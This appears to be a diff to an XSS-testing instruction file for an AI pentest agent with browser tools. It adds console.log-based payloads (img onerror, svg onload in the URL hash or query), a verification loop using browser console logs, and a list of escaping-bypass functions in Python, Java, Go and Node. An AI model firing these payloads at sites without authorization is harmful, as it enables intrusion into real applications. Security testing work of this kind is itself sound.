@@ -11,11 +11,56 @@
 </scope>
 
 <methodology>
-1. Identify sources (URL/query/hash/referrer, postMessage, storage, WebSocket, service worker messages, server JSON) and trace to sinks.
-2. Classify sink context: HTML node, attribute, URL, script block, event handler, JavaScript eval-like, CSS, SVG foreignObject.
-3. Determine current defenses: output encoding, sanitizer, CSP, Trusted Types, DOMPurify config, framework auto-escaping.
-4. Craft minimal payloads per context; iterate with encoding/whitespace/casing/DOM mutation variants; confirm with observable side effects beyond alert.
+14. Identify sources (URL/query/hash/referrer, postMessage, storage, WebSocket, service worker messages, server JSON) and trace to sinks.
+15. Classify sink context: HTML node, attribute, URL, script block, event handler, JavaScript eval-like, CSS, SVG foreignObject.
+16. Determine current defenses: output encoding, sanitizer, CSP, Trusted Types, DOMPurify config, framework auto-escaping.
+17. Craft minimal payloads per context. **Prioritize console.log() over alert()** for automated verification (e.g., `<script>console.log('XSS_CONFIRMED')</script>`).
 </methodology>
+
+<browser_verification>
+**CRITICAL: Smart Detection via Console Logs**
+Browser-based verification is the most reliable method for XSS. Do NOT rely on screen reading for `alert()` boxes.
+
+1. **Inject Non-Blocking Payloads**:
+   Use `console.log('UNIQUE_ID')` instead of `alert()`. Alerts block execution and are hard to detect automation-side.
+   - Good: `<img src=x onerror=console.log('XSS_HERE')>`
+   - Bad: `<script>alert(1)</script>`
+
+2. **Retrieve Logs**:
+   After injection, ALWAYS call:
+   `browser_action(action="get_console_logs", tab_id=...)`
+
+3. **Verify Execution**:
+   Parse the logs for your unique string. This proves code execution without relying on visual OCR or hanging the browser.
+</browser_verification>
+
+<dangerous_functions>
+When analyzing source code, look for manual escaping bypasses:
+
+<python>
+- Flask/Jinja2: `mark_safe(...)`, `|safe` filter, `Markup(...)`
+- Django: `mark_safe(...)`, `format_html(...)` (if used incorrectly)
+- Raw HTML generation: `render_template_string(...)` with f-strings
+</python>
+
+<java>
+- JSP: `<c:out value="${...}" escapeXml="false"/>`
+- Spring: `HtmlUtils.htmlUnescape(...)`
+- Direct Response Writing: `response.getWriter().write(...)` without escaping
+</java>
+
+<go>
+- html/template: `template.HTML(...)`, `template.JS(...)` (bypasses auto-escaping)
+- `w.Write(...)` with user input directly
+- `fmt.Fprintf(w, ...)` with user input
+</go>
+
+<javascript_node>
+- `dangerouslySetInnerHTML`, `v-html`, `innerHTML`
+- `res.send(...)` with unsanitized input
+- `eval(...)`, `setTimeout(...)` with user strings
+</javascript_node>
+</dangerous_functions>
 
 <injection_points>
 - Server render: templates (Jinja/EJS/Handlebars), SSR frameworks, email/PDF renderers
@@ -242,57 +287,31 @@ print(f"\n[*] Found {len(findings)} potential XSS points")
 
 ```python
 # Use browser_action tool for DOM XSS
-# Step 1: Launch browser and setup alert detection
+# Step 1: Launch browser
 browser_action(action="launch", url="https://target.com")
 
-# Step 2: Inject DOM instrumentation
-browser_action(action="execute_js", js_code="""
-// Instrument dangerous sinks
-const originalInnerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
-Object.defineProperty(Element.prototype, 'innerHTML', {
-    set: function(value) {
-        console.log('[SINK] innerHTML:', value);
-        if (/<script|<img|<svg|onerror|onload/i.test(value)) {
-            console.log('[!] Potential XSS in innerHTML');
-        }
-        return originalInnerHTML.set.call(this, value);
-    }
-});
-
-// Track eval/Function calls
-const originalEval = window.eval;
-window.eval = function(code) {
-    console.log('[SINK] eval:', code);
-    return originalEval(code);
-};
-
-// Setup alert detection
-window.alert = function(msg) {
-    console.log('[!] XSS CONFIRMED: alert(' + msg + ')');
-    window.__xss_detected = true;
-};
-
-console.log('[*] DOM instrumentation active');
-""")
-
-# Step 3: Test DOM XSS payloads
+# Step 2: Test DOM XSS payloads with console.log
 dom_payloads = [
-    "#<img src=x onerror=alert(1)>",
-    "?q=<svg onload=alert(1)>",
-    "#q='-alert(1)-'"
+    "#<img src=x onerror=console.log('XSS_CONFIRMED_IMG')>",
+    "?q=<svg onload=console.log('XSS_CONFIRMED_SVG')>",
+    "#q='-console.log('XSS_CONFIRMED_JS')-'"
 ]
 
 for payload in dom_payloads:
+    print(f"[*] Testing payload: {payload}")
     browser_action(action="goto", url=f"https://target.com{payload}")
     browser_action(action="wait", duration=2.0)
     
-    # Check if XSS was detected
-    result = browser_action(action="execute_js", js_code="return window.__xss_detected || false;")
-    if result.get('result'):
-        print(f"[!] DOM XSS CONFIRMED: {payload}")
-
-# Step 4: Get console logs
-browser_action(action="get_console_logs")
+    # Step 3: Check console logs for confirmation
+    logs_result = browser_action(action="get_console_logs")
+    logs = logs_result.get('logs', [])
+    
+    # Flatten logs if needed or check directly
+    log_text = str(logs)
+    
+    if "XSS_CONFIRMED" in log_text:
+        print(f"[!] DOM XSS CONFIRMED via Console: {payload}")
+        print(f"    Log Evidence: {logs}")
 ```
 
 **Python + Playwright for Advanced DOM XSS:**
